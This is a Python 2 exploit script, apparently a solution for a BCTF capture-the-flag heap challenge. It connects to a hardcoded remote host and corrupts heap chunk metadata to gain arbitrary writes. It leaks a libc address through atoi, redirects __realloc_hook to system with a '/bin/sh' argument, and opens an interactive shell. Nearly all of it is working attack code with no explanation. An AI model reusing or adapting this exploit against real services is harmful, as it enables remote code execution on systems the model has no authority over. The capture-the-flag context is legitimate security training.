#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
import re

#host = "10.211.55.16"
#port = 8888
host = "104.199.132.199"
port = 1980

#BCTF{hell0_Mall0c_guru}

sock = make_conn(host,port)

def tear(s):
    recvuntil(sock,"exit")
    sendline(sock,"3")
    recvuntil(sock,":")
    sendline(sock,str(len(s)))
    recvuntil(sock,":")
    sendline(sock,s)

def edit(s):
    recvuntil(sock,"exit")
    sendline(sock,"2")
    recvuntil(sock,":")
    sendline(sock,s)

def title(s):
    recvuntil(sock,"exit")
    sendline(sock,"5")
    recvuntil(sock,":")
    sendline(sock,s)

def name(s):
    recvuntil(sock,"exit")
    sendline(sock,"4")
    recvuntil(sock,"name:")
    sock.send(s)

def show():
    recvuntil(sock,"exit")
    sendline(sock,"1")
    data = recvuntil(sock,"Welcome")
    return data


payload = "b"*0x30 +  pack(0) + pack(0x41) 
edit(payload)
tear("a"*272)

name( pack(0) + pack(0x20) + pack(0x602040-0x18) + pack(0x602040-0x10) + pack(0x20)+ "\x40")

tear("d"*128)

recvuntil(sock,"exit")
tear("a"*256)
name("a"*0x8 + pack(0x602030) + pack(0x601ff0) + pack(0x602030) + pack(0) + "\x40")
data = show()
atoiaddr  = unpack(data.split("\n")[2].ljust(8,"\x00"))
libc = atoiaddr - 0x39f50 #atoi off
print hex(libc)
realloc_hook = libc + 0x3be730
binsh = libc + 0x17ccdb
system = libc + 0x46640
title( pack(realloc_hook) + pack(binsh) + pack(realloc_hook) + pack(0x128) + pack(0))
title(pack(system))
recvuntil(sock,"exit")
recvuntil(sock,"exit")
sendline(sock,"3")
recvuntil(sock,"(bytes):")
sendline(sock,"256")
print "Get shell : "
inter(sock)
